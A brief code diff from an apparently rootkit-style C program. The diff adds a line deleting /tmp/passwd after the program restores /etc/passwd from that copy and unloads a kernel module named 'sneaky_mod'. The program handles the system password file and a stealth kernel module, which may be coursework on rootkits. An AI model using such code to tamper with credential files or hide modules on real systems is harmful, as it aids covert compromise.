@@ -52,5 +52,6 @@ int main() {
   //After the while loop ends:
   copyFileContents("/tmp/passwd", "/etc/passwd");
   system("rmmod sneaky_mod");
+  system("rm /tmp/passwd");
   return 0;
 }
